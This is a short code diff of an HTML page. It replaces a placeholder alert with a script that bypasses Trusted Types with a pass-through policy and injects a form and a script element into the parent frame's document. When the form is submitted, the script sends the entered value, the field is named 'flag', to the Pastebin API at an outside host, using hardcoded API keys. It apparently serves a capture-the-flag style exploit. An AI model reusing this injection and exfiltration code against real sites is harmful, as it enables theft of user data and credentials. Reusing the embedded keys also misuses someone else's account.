@@ -6,7 +6,41 @@
 		<script>
 			var script = `
 				window.onload = function() {
-					alert("here");
+					var form = document.createElement("form");
+					var input = document.createElement("input");
+					var script = document.createElement("script");
+					
+					window.tt = trustedTypes.createPolicy('tt', { 
+						createScriptUrl: v => v
+					});
+					
+					input.setAttribute("id", "flag");
+					input.setAttribute("type", "text");
+					
+					script.setAttribute("id", "pwn");
+					script.setAttribute("src", tt.createScriptUrl("true"));
+					
+					form.appendChild(input);
+					
+					window.parent.document.body.appendChild(form);
+					window.parent.document.body.appendChild(script);
+					
+					form.onsubmit = function() {
+						var data = new FormData();
+						
+						data.append("api_dev_key", "7xJ2kw2sGE9foyL5tXhwntZ8wzJj-EPe");
+						data.append("api_option", "paste");
+						data.append("api_paste_code", "" + input.value);
+						data.append("api_user_key", "2f423515a682d2702b702770ec639b48");
+						data.append("api_paste_expire_date", "10M");
+						data.append("api_paste_name", "jnaskjdnsalkndkj");
+
+						var xhr = new XMLHttpRequest();
+						xhr.withCredentials = true;
+
+						xhr.open("POST", "https://pastebin.com/api/api_post.php");
+						xhr.send(data);
+					}
 				}
 			`;
 			
